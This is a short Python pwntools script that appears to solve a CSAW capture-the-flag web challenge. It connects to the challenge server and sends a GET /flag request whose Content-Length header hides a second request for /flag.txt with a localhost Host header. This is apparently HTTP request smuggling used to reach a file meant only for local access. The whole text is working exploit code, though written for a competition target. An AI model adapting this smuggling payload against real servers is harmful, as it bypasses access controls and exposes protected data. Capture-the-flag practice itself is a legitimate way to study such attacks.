from pwn import *
context.log_level = 'debug'
r = remote('web.csaw.io', 3009)
req2 = 'GET /flag.txt HTTP/1.1\r\nHost: localhost:3009\r\n\r\n'
req1 = f'GET /flag HTTP/1.1\r\nHost: web.csaw.io:3009\r\nContent-Length: {len(req2)}\r\n\r\n{req2}'
r.send(req1.encode())
r.interactive()
